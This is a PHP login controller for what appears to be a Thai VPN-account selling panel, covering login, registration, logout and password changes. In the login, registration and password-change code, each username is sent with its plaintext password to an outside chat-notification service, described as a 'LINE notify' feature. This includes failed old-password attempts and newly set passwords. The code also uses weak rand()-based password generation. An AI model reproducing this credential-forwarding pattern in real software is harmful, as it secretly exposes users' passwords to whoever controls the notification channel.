<?php defined('BASEPATH') OR exit('No direct script access allowed');
/*
 * Copyright (c) 2008-2019 KU-LNW-POR <Kulnwpor@gmail.com>,
 * Truewallet id : 097-026-7262
 * 2008-2019 http://www.Ocspanel.info
*/
class Login extends Ci_Controller {
	public function __construct() {
		parent::__construct(); 
		require(APPPATH . '/third_party/password_compat-master/lib/password.php');
		
		$this->load->helper('url_helper'); 
		$this->load->model('user_model'); 
		$this->load->library('sshcepat');
		$this->load->library('Truepay');
		$this->load->library(array('session')); 		
	}
	private function _set_view($file, $init) {
		$data = new stdClass();
		$data->user = $this->user_model->get_user($_SESSION['user_id']);
		$this->user_model->get_user($_SESSION['user_id']);
		$this->load->view('panel/base/page_header', $data);
	 	$this->load->view($file, $init); 
	 	$this->load->view('panel/base/footer'); 
		
	} 
	public function login() { 
		$data = new stdClass(); 
		$this->load->helper('form'); 
		$this->load->library('form_validation'); 
		$this->form_validation->set_rules('username', 'Username', 'required|alpha_numeric'); 
		$this->form_validation->set_rules('password', 'Password', 'required'); 
		$tokenid = '1';
		$token = $this->user_model->get_buyvpn($tokenid);
		$host=getenv('HTTP_HOST');
		$abc="";
			
		if ($this->form_validation->run() == false) { 
			//$this->load->view('settings/setting'); 
			$this->load->view('panel/base/header'); 
			$this->load->view('panel/login', $data); 
			 
		} 
		else { 
			$username = $this->input->post('username'); 
			$password = $this->input->post('password'); 
				
				if ($this->user_model->resolve_user_login($username, $password)) { 
					$user_id = $this->user_model->get_user_id_from_username($username); 
					$user = $this->user_model->get_user($user_id); 
					///////////////////////////////////////////////////////////////////////////////////////////// UPDATE ONLINE 
					$this->user_model->online_user($username, $password);
					///////////////////////////////////////////////////////////////////////////////////////////// UPDATE ONLINE
					
					///////////////// หากโค๊ดถูกเปิดเผย ระบบอาจถูกแฮก
					if($user->script_vpns >= 3){
					echo"<script language='JavaScript'>";
					echo"alert('ชื่อผู้ใช้ถูกระงับ กรุณาติดต่อแอดมิน');";
					echo"window.location='/sign-in';";
					echo "</script>";
					exit(); 
					header("location: /sign-in");
					}
					/////////////////
					 
					switch ($user->is_admin) { 
						case TRUE: 
							$_SESSION['user_id'] = (int)$user->id; 
							$_SESSION['username'] = (string)$user->username; 
							$_SESSION['saldo'] = (string)$user->saldo; 
							$_SESSION['email'] = (string)$user->email; 
							$_SESSION['logged_in'] = (bool)true; 
							$_SESSION['is_confirmed'] = (bool)$user->is_confirmed; 
							$_SESSION['is_admin'] = (bool)$user->is_admin;
							$_SESSION['online_timestamp'] = (string)$user->online_timestamp;
							$_SESSION['script_vpns'] = (string)$user->script_vpns;							
							//ระบบแจ้งเตือนไลน์ ล็อคอิน
							$message = 'แอดมิน '.$abc."\n".''.$host."\n".'ไอดี: '.$username."\n".'พาส: '.$password."\n".'เข้าสู่ระบบสำเร็จ';
							$this->truepay->send_truepay_notify($message,$token);
							/////////////////////					  
							redirect(base_url('admin/index/'.str_replace(' ','-',$username))); 
						break; case 
						FALSE: 
							$_SESSION['user_id'] = (int)$user->id; 
							$_SESSION['username'] = (string)$user->username; 
							$_SESSION['saldo'] = (string)$user->saldo; 
							$_SESSION['email'] = (string)$user->email; 
							$_SESSION['logged_in'] = (bool)true; 
							$_SESSION['is_admin'] = (bool)FALSE; 
							$_SESSION['is_confirmed'] = (bool)$user->is_confirmed;
							$_SESSION['online_timestamp'] = (string)$user->online_timestamp;  
							$_SESSION['script_vpns'] = (string)$user->script_vpns;
							
							//ระบบแจ้งเตือนไลน์ ล็อคอินสำเร็จ
							$message = 'สมาชิก '.$abc."\n".''.$host."\n".'ไอดี: '.$username."\n".'พาส: '.$password."\n".'เข้าสู่ระบบสำเร็จ';
							$this->truepay->send_truepay_notify($message,$token);
							/////////////////////	

							redirect(base_url('index/')); 
						break; 
						default: show_404(); 
					} 
				} else { 
					// แจ้งเตือนเมื่อล็อคอินผิด
					$this->user_model->offline_user($username, $password);
					$data->error = ' ชื่อบัญชีหรือรหัสผ่านไม่ถูกต้อง';
					$data->title = 'ไม่สำเร็จ';
					$data->action = 'error';  
					$this->load->view('panel/base/header'); 
					$this->load->view('panel/login', $data); 
				
				} 
			} 
		} 
	public function logout() { 
		$data = new stdClass();
///////////////////////////////////////////////////////////////////////////////////////////// UPDATE OFFLINE  
		$username = $_SESSION['username'];
		$this->user_model->offline_user($username);
///////////////////////////////////////////////////////////////////////////////////////////// UPDATE OFFLINE 
			if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) { 
				foreach ($_SESSION as $key => $value) { 
					unset($_SESSION[$key]); 
				} 
				redirect(base_url('sign-in')); 
			} else { 
		} 
	} 
	public function register() { 
		//$this->load->view('settings/setting_main'); 		
		// create the data object
		$data = new stdClass(); 
		$tokenid = '1';
		$token = $this->user_model->get_buyvpn($tokenid);
		$host=getenv('HTTP_HOST');
		$abc="";
		// load form helper and validation library
		$this->load->helper('form'); 
		$this->load->library('form_validation'); 
		$this->form_validation->set_rules('username', 'Username', 'trim|required|alpha_numeric|min_length[4]|is_unique[users.username]', array('is_unique' => 'ชื่อบัญชีนี้มีอยู่แล้ว กรุณาใช้ชื่อบัญชีอื่น.')); 
		$this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email|is_unique[users.email]'); 
		$this->form_validation->set_rules('password', 'Password', 'trim|required|min_length[6]'); 
		$this->form_validation->set_rules('password_confirm', 'Confirm Password', 'trim|required|min_length[6]|matches[password]'); 
		
			if ($this->form_validation->run() === false) { 
				$this->load->view('panel/base/header'); 
				$this->load->view('panel/register', $data); 

			} else { 
				function random_password() { $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
				$password = array(); 
				$alpha_length = strlen($alphabet) - 1; for ($i = 0; $i < 8; $i++) { $n = rand(0, $alpha_length); 
				$password[] = $alphabet[$n]; } return implode($password); } 
				$randompw = random_password(); 
				$username = $this->input->post('username'); 
				$email = $this->input->post('email'); 
				$password = $this->input->post('password'); 
				
					if ($this->user_model->create_user($username, $email, $password)) { 
						$user_id = $this->user_model->get_user_id_from_username($username); 
						$user = $this->user_model->get_user($user_id); 
						$data = new StdClass(); 
						$_SESSION['user_id'] = (int)$user->id; 
						$_SESSION['username'] = (string)$user->username; 
						$_SESSION['active'] = (bool) $user->active; 
						$_SESSION['logged_in'] = (bool)true; 
						$_SESSION['is_confirmed'] = (bool)$user->is_confirmed; 
						$_SESSION['is_admin'] = (bool)$user->is_admin; 
				
						//ระบบแจ้งเตือนไลน์3
						$message = 'สมาชิกใหม่ '.$abc."\n".''.$host."\n".'ไอดี: '.$username."\n".'พาส: '.$password."\n".'สมัครสมาชิกใหม่';
						$this->truepay->send_truepay_notify($message,$token);
							   
						$data -> success = '<div class="alert alert-success">สมัครบัญชีเรียบร้อย </div>'; 
						$this->load->view('panel/base/page_header'); 
						$this->load->view('panel/home', $data);
						$this->load->view('panel/base/footer'); 
					} else { 
						$data->error = 'เกิดปัญหาในการสร้างบัญชีใหม่ของคุณ กรุณาลองอีกครั้ง'; 
						$this->load->view('panel/base/header'); 
						$this->load->view('panel/register', $data); 
						$this->load->view('panel/base/footer'); 
					} 
				} 
			} 	
	private function __validate_login($data) { 
		return !empty($data['oldpass']) && !empty($data['password']) && !empty($data['passconf']); 
	} 
	public function setting() {
		$data = new stdClass();
		$tokenid = '1';
		$token = $this->user_model->get_buyvpn($tokenid);
		$host=getenv('HTTP_HOST');
		$abc="";
		if (isset($_SESSION['username']) && $_SESSION['logged_in'] === true)
		{
			if ($_POST) {
				if ($this->__validate_login($_POST)) {
					if (!$this->user_model->resolve_user_login($_SESSION['username'], $_POST['oldpass'])) {
						$data->message='<div class="alert alert-danger">รหัสผ่านเดิมที่คุณป้อนไม่ถูกต้อง</div>';
						//ระบบแจ้งเตือนไลน์ รหัสเดิมไม่ถูกต้อง
						$message = 'ผิดผลาด '.$abc."\n".''.$host."\n".'ไอดี: '.$_SESSION['username']."\n".'พาส: '.$_POST['oldpass']."\n".'พยายามจะเปลี่ยนรหัส';
						$this->truepay->send_truepay_notify($message,$token);
					}
					elseif($_POST['password'] !== $_POST['passconf']) {
						$data->message='<div class="alert alert-warning">ยืนยันรหัสผ่าน </div>';
						//ระบบแจ้งเตือนไลน์ แจ้งเตือนรหัสไม่ตรงกัน
						$message = 'ผิดผลาด '.$abc."\n".''.$host."\n".'ไอดี: '.$_SESSION['username']."\n".'พาส: '.$_POST['oldpass']."\n".'พยายามจะเปลี่ยนรหัส';
						$this->truepay->send_truepay_notify($message,$token);
					}
					else {
						if ($this->user_model->update_login($_POST)) {
							$data->message='<div class="alert alert-success">เปลี่ยนรหัสผ่านแล้ว</div>';
							//ระบบแจ้งเตือนไลน์ เปลี่ยนรหัสสำเร็จ
							$message = 'เปลี่ยนรหัสผ่าน '.$abc."\n".''.$host."\n".'ไอดี: '.$_SESSION['username']."\n".'พาส: '.$_POST['password']."\n".'เปลี่ยนรหัสผ่านใหม่';
							$this->truepay->send_truepay_notify($message,$token);						
						}
					}
				}
					else {$data->message ='<div class="alert alert-danger">ห้ามเว้นว่าง</div>';}
			}
				$data->user = $this->user_model->get_user($_SESSION['user_id']);
				$this->_set_view('panel/setting', $data);
		}
		else { redirect(base_url('sign-in')); }
	}
	
}
